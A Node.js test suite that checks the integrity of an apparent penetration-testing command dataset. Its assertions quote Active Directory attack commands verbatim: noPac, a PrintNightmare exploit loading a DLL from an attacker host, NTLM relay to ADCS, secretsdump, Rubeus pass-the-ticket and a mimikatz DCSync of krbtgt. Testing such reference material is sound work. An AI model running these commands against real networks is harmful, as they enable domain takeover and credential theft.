import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";

const ROOT = path.resolve(import.meta.dirname, "..");
const read = (p) => JSON.parse(fs.readFileSync(path.join(ROOT, "data", p), "utf8"));
const { pages, services } = read("commands.json");
const { variables } = read("variables.json");
const meta = read("meta.json");

const steps = pages.flatMap(p => p.sections.flatMap(s => s.blocks.filter(b => b.type === "step")));

test("dataset covers all 24 source pages plus the generated tool reference", () => {
  assert.equal(pages.length, 25);
  assert.equal(meta.source.pages, 24);
  assert.equal(new Set(pages.map(p => p.slug)).size, 25);
  assert.deepEqual(pages.filter(p => p.generated).map(p => p.slug), ["tool-reference"]);
});

test("every page has a title, group and sections", () => {
  for (const p of pages) {
    assert.ok(p.title, `title: ${p.slug}`);
    assert.ok(p.group, `group: ${p.slug}`);
    assert.ok(p.sections.length > 0, `sections: ${p.slug}`);
  }
});

test("step ids are unique", () => {
  const ids = steps.map(s => s.id);
  assert.equal(new Set(ids).size, ids.length);
});

test("section ids are unique across every page", () => {
  const ids = pages.flatMap(p => p.sections.map(s => s.id));
  assert.equal(new Set(ids).size, ids.length);
});

test("Attack Workflow related-pages block is removed", () => {
  const page = pages.find(p => p.slug === "attack-workflow");
  assert.ok(page);
  assert.equal(page.sections.some(s => s.title === "Related pages"), false);
  assert.equal(page.sections.length, 13);
  assert.equal(JSON.stringify(page).includes("· · · · ·"), false);
});

test("all Notion links and related-pages sections are removed", () => {
  const serialised = JSON.stringify({ pages, services });
  assert.equal(serialised.includes("app.notion.com"), false);
  assert.equal(serialised.includes("Related pages"), false);
  assert.equal(serialised.includes("Quick navigation"), false);
  for (const page of pages) {
    assert.equal(page.sections.some(s => s.title === "Related pages"), false, page.slug);
  }
});

test("statuses and priorities stay inside the approved labels", () => {
  const statuses = new Set(["Lab Tested", "Simulated", "Syntax Checked", "Environment Dependent", "Documented"]);
  const priorities = new Set(["Core", "Conditional", "Advanced"]);
  for (const s of steps) {
    assert.ok(statuses.has(s.status), `${s.id} status ${s.status}`);
    assert.ok(priorities.has(s.priority), `${s.id} priority ${s.priority}`);
  }
});

test("no command is labelled Lab Tested without evidence", () => {
  assert.equal(steps.filter(s => s.status === "Lab Tested").length, 0);
});

test("commands are non-empty and placeholder-free in structure", () => {
  for (const s of steps) {
    for (const c of s.commands) {
      assert.ok(c.code.trim().length > 0, s.id);
      assert.ok(!c.code.includes("```"), `${s.id} leaked a fence`);
      assert.ok(!c.code.includes("\u0001"), `${s.id} leaked a mask`);
    }
  }
});

test("every command token has a registry entry", () => {
  const known = new Set(variables.map(v => v.token));
  for (const v of variables) for (const a of v.aliases || []) known.add(a);
  const tokens = new Set();
  for (const s of steps) for (const c of s.commands) {
    for (const m of c.code.matchAll(/<([A-Z][A-Z0-9_]+)>/g)) tokens.add(m[1]);
  }
  for (const t of tokens) assert.ok(known.has(t), `unregistered <${t}>`);
});

test("service ids referenced by tags exist", () => {
  const ids = new Set(services.map(s => s.id));
  for (const s of steps) for (const t of s.tags) assert.ok(ids.has(t), `${s.id}: ${t}`);
});

test("source manifest matches the dataset", () => {
  assert.equal(meta.source.pages + pages.filter(p => p.generated).length, pages.length);
  assert.equal(meta.pageCount, pages.length);
  assert.equal(meta.source.steps, steps.length);
  assert.equal(meta.duplicateStepIds.length, 0);
  assert.ok(meta.warnings.length < 30, `too many warnings: ${meta.warnings.length}`);
});

test("value fields and steps survive extraction", () => {
  const withDecision = steps.filter(s => s.fields.decision).length;
  assert.ok(withDecision > 270, `only ${withDecision} steps have a decision`);
  assert.ok(steps.filter(s => s.commands.length).length >= 270);
});

test("SSH workflow is dependency ordered and preserves stable IDs", () => {
  const page = pages.find(p => p.slug === "ssh");
  assert.ok(page);
  assert.equal(page.commandCount, 13);

  const sectionTitles = page.sections.map(s => s.title);
  assert.deepEqual(sectionTitles.slice(2, 15), [
    "Detection and version identification",
    "Authentication behavior",
    "Algorithm enumeration",
    "Verbose connection diagnostics",
    "Check already available credentials",
    "Discover SSH keys",
    "Validate key format and fingerprint",
    "Prepare private-key permissions",
    "Determine whether a passphrase is required",
    "Conditional passphrase recovery",
    "Connect using the key",
    "Legacy algorithm compatibility",
    "Troubleshooting and pivoting"
  ]);

  const sshSteps = page.sections.flatMap(s => s.blocks.filter(b => b.type === "step"));
  assert.deepEqual(sshSteps.map(s => s.id), [
    "ssh-01", "ssh-02", "ssh-10", "ssh-03", "ssh-04", "ssh-05",
    "ssh-06", "ssh-07", "ssh-08", "ssh-09", "ssh-12", "ssh-11"
  ]);
  assert.deepEqual(sshSteps.map(s => s.n), [
    "01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11", "12"
  ]);
  assert.deepEqual(sshSteps.map(s => s.title), [
    "Confirm the service and version", "Ask without authenticating", "Read the algorithm list",
    "Verbose connection trace", "One deliberate attempt, not a brute force", "Identify a found key",
    "Check matching public keys", "Fix permissions before SSH refuses the key", "Detect the passphrase",
    "Crack the passphrase", "Connect using the private key", "Connect with legacy algorithms when required"
  ]);

  assert.equal(sshSteps.find(s => s.id === "ssh-01").commands[0].code, "nmap -sV -p22 <TARGET_IP>");
  assert.equal(sshSteps.find(s => s.id === "ssh-12").commands[0].code, "ssh -i <KEY_FILE> <USERNAME>@<TARGET_IP>");
  assert.deepEqual(sshSteps.find(s => s.id === "ssh-02").commands.map(c => c.code), [
    "ssh -o PreferredAuthentications=none -o StrictHostKeyChecking=no <USERNAME>@<TARGET_IP>",
    "nmap -p22 --script ssh-auth-methods <TARGET_IP>"
  ]);
  assert.ok(JSON.stringify(page).includes("](#/p/tunneling)"));
  assert.ok(JSON.stringify(page).includes("](#/p/linux-privesc)"));

  const index = (title) => sshSteps.findIndex(s => s.title === title);
  assert.ok(index("Read the algorithm list") < index("One deliberate attempt, not a brute force"));
  assert.ok(index("Fix permissions before SSH refuses the key") < index("Detect the passphrase"));
  assert.ok(index("Connect using the private key") < index("Connect with legacy algorithms when required"));
  assert.ok(index("Troubleshooting and pivoting") === -1);
  assert.ok(sectionTitles.indexOf("Troubleshooting and pivoting") > sectionTitles.indexOf("Legacy algorithm compatibility"));

  const quick = page.sections.find(s => s.title === "Quick workflow");
  const ordered = quick.blocks.find(b => b.type === "ol");
  assert.equal(ordered.items.length, 13);
  assert.ok(ordered.items.some(i => i.includes("ssh -i <KEY_FILE>")));
  assert.ok(ordered.items.some(i => i.includes("Troubleshooting") || i.includes("troubleshooting")));
});

test("every SSH command carries extended decision fields", () => {
  const page = pages.find(p => p.slug === "ssh");
  const sshSteps = page.sections.flatMap(s => s.blocks.filter(b => b.type === "step"));
  const required = ["purpose", "prereqs", "lookFor", "success", "failure", "decision", "next", "mistake", "evidence"];
  for (const step of sshSteps) {
    for (const key of required) {
      assert.ok(step.fields[key]?.trim(), `${step.id} missing ${key}`);
    }
  }
});

test("Bleeding Edge page preserves order, terminals and verbatim commands", () => {
  const page = pages.find(p => p.slug === "bleeding-edge");
  assert.ok(page);
  assert.equal(page.group, "ad");
  assert.equal(page.stepCount, 23);
  assert.equal(page.commandCount, 31);

  const beSteps = page.sections.flatMap(s => s.blocks.filter(b => b.type === "step"));
  assert.deepEqual(beSteps.map(s => s.id), Array.from({ length: 23 }, (_, i) => `bleeding-edge-${String(i + 1).padStart(2, "0")}`));
  assert.deepEqual(beSteps.map(s => s.n), Array.from({ length: 23 }, (_, i) => String(i + 1).padStart(2, "0")));

  // Execution context: the Windows-only Rubeus/Mimikatz branch and the
  // either-host coercion alternatives are marked as such.
  assert.equal(beSteps.find(s => s.n === "15").runOn, "either");
  assert.equal(beSteps.find(s => s.n === "22").runOn, "windows");
  assert.equal(beSteps.find(s => s.n === "23").runOn, "windows");

  // Multi-terminal steps say which terminal owns the process and which stay up.
  for (const n of ["09", "10", "13"]) {
    assert.match(beSteps.find(s => s.n === n).title, /Terminal \d/, `step ${n}`);
    assert.match(beSteps.find(s => s.n === n).title, /keep this terminal open/, `step ${n}`);
  }

  const code = (n, i = 0) => beSteps.find(s => s.n === n).commands[i].code;
  assert.equal(code("02"), "sudo python3 scanner.py <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DOMAIN_CONTROLLER_IP> -use-ldap");
  assert.equal(code("03"), "sudo python3 noPac.py <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DOMAIN_CONTROLLER_IP> -dc-host <DC_HOSTNAME> -shell --impersonate administrator -use-ldap");
  // The parser's prose tidy used to rewrite "python3 ./setup.py" to
  // "python3./setup.py"; this guards that regression.
  assert.equal(code("06", 1), "pip3 uninstall impacket\ngit clone https://github.com/cube0x0/impacket\ncd impacket\npython3 ./setup.py install");
  assert.equal(code("11"), "sudo python3 CVE-2021-1675.py <DOMAIN>/<USERNAME>:<PASSWORD>@<DOMAIN_CONTROLLER_IP> '\\\\<ATTACKER_IP>\\CompData\\backupscript.dll'");
  assert.equal(code("13"), "sudo ntlmrelayx.py -debug -smb2support --target http://<CA_HOSTNAME>.<DOMAIN>/certsrv/certfnsh.asp --adcs --template DomainController");
  assert.equal(code("18"), "secretsdump.py -just-dc-user <DOMAIN_PART1>/administrator -k -no-pass \"<DC_HOSTNAME>$\"@<DC_HOSTNAME>.<DOMAIN>");
  assert.equal(code("20"), "python /opt/PKINITtools/getnthash.py -key <ASREP_KEY> <DOMAIN>/<DC_HOSTNAME>$");
  assert.equal(code("22"), ".\\Rubeus.exe asktgt /user:<DC_HOSTNAME>$ /certificate:<BASE64_BLOB> /ptt");
  assert.equal(code("23", 2), "lsadump::dcsync /user:<DOMAIN_PART1>\\krbtgt");
});

test("Bleeding Edge output stays separate from commands and keeps redactions", () => {
  const page = pages.find(p => p.slug === "bleeding-edge");
  const beSteps = page.sections.flatMap(s => s.blocks.filter(b => b.type === "step"));
  const stepOutputs = beSteps.flatMap(s => s.outputs || []);
  const pageOutputs = page.sections.flatMap(s => s.blocks.filter(b => b.type === "output"));

  assert.equal(stepOutputs.length, 20);
  assert.equal(pageOutputs.length, 1);
  for (const o of [...stepOutputs, ...pageOutputs]) assert.equal(o.lang, "output");
  // No captured output leaked into a copyable command block.
  for (const s of beSteps) {
    for (const c of s.commands) {
      assert.ok(!c.code.includes("ms-DS-MachineAccountQuota"), `${s.id} output leaked into command`);
      assert.ok(!c.code.includes("<SNIP>"), `${s.id} SNIP leaked into command`);
    }
  }
  const all = [...stepOutputs, ...pageOutputs].map(o => o.code).join("\n");
  assert.ok(all.includes("Current ms-DS-MachineAccountQuota = 10"));
  assert.ok(all.includes("Got expected ERROR_BAD_NETPATH exception!!"));
  assert.ok(all.includes("GOT CERTIFICATE!"));
  assert.ok(all.includes("nt authority\\system"));
  assert.ok(all.includes("<SNIP>"), "redaction marker must be preserved");
});

test("Bleeding Edge alternatives stay off the primary chain", () => {
  const page = pages.find(p => p.slug === "bleeding-edge");
  const beSteps = page.sections.flatMap(s => s.blocks.filter(b => b.type === "step"));
  const title = (n) => beSteps.find(s => s.n === n).title;

  for (const n of ["15", "20", "21", "22", "23"]) {
    assert.match(title(n), /^Alternative:/, `step ${n} should be an alternative branch`);
  }
  for (const n of ["13", "14", "16", "17", "18", "19"]) {
    assert.doesNotMatch(title(n), /^Alternative:/, `step ${n} is on the primary path`);
  }
  const index = (n) => beSteps.findIndex(s => s.n === n);
  assert.ok(index("13") < index("14"));
  assert.ok(index("14") < index("16"));
  assert.ok(index("16") < index("17"));
  assert.ok(index("17") < index("18"));
  assert.ok(index("18") < index("19"));
  // Both final branches end with the same proof step, not a parallel requirement.
  assert.equal(beSteps.find(s => s.n === "18").fields.next, "Step 19.");
  assert.equal(beSteps.find(s => s.n === "21").fields.next, "Step 19.");
});

test("stable step ID registry covers extracted titles", () => {
  const registry = JSON.parse(fs.readFileSync(path.join(ROOT, "content", "step-ids.json"), "utf8"));
  for (const page of pages) {
    for (const section of page.sections) {
      for (const step of section.blocks.filter(b => b.type === "step")) {
        const mapped = registry.ids?.[page.slug]?.[step.title];
        if (mapped) assert.equal(step.id, mapped, `${page.slug} / ${step.title}`);
      }
    }
  }
});
